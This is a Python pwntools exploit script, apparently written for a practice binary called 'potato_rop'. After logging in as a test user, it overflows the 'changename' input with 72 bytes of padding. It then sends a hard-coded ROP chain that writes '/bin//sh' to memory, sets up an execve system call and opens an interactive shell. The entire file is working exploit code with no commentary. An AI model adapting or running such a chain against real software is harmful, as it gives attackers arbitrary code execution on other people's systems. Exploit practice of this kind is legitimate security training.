#!/usr/bin/env python3

from pwn import *
from struct import pack
import sys


elf = ELF("./potato_rop")

process = elf.process(["console"], stdin=PTY, aslr=False) # stdin=PTY for "getpass" password input
gdb.attach(process, '''
continue
''')

print(process.recvuntil(b"cmd> ")) # username
process.sendline(b"login")
# test user
process.sendline(b"peter")
process.sendline(b"12345")
print(process.recvuntil(b"cmd> ")) # username
# logged in
#p.interactive()
process.sendline(b"changename")

# Padding goes here
p = b'\x41'*72

p += pack('<Q', 0x000000000040cdba) # pop rsi ; ret
p += pack('<Q', 0x00000000004d20e0) # @ .data
p += pack('<Q', 0x0000000000448987) # pop rax ; ret
p += b'/bin//sh'
p += pack('<Q', 0x000000000044b361) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x000000000040cdba) # pop rsi ; ret
p += pack('<Q', 0x00000000004d20e8) # @ .data + 8
p += pack('<Q', 0x0000000000439d20) # xor rax, rax ; ret
p += pack('<Q', 0x000000000044b361) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x00000000004057d1) # pop rdi ; ret
p += pack('<Q', 0x00000000004d20e0) # @ .data
p += pack('<Q', 0x000000000040cdba) # pop rsi ; ret
p += pack('<Q', 0x00000000004d20e8) # @ .data + 8
p += pack('<Q', 0x000000000044acba) # pop rdx ; pop rbx ; ret
p += pack('<Q', 0x00000000004d20e8) # @ .data + 8
p += pack('<Q', 0x4141414141414141) # padding
p += pack('<Q', 0x0000000000439d20) # xor rax, rax ; ret
p += pack('<Q', 0x000000000047e0a0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000047e0a0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000047e0a0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000047e0a0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000047e0a0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000047e0a0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000047e0a0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000047e0a0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000047e0a0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000047e0a0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000047e0a0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000047e0a0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000047e0a0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000047e0a0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000047e0a0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000047e0a0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000047e0a0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000047e0a0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000047e0a0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000047e0a0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000047e0a0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000047e0a0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000047e0a0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000047e0a0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000047e0a0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000047e0a0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000047e0a0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000047e0a0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000047e0a0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000047e0a0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000047e0a0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000047e0a0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000047e0a0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000047e0a0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000047e0a0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000047e0a0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000047e0a0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000047e0a0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000047e0a0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000047e0a0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000047e0a0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000047e0a0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000047e0a0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000047e0a0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000047e0a0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000047e0a0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000047e0a0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000047e0a0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000047e0a0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000047e0a0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000047e0a0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000047e0a0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000047e0a0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000047e0a0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000047e0a0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000047e0a0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000047e0a0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000047e0a0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000047e0a0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004011a0) # syscall

process.sendline(p)

process.interactive()



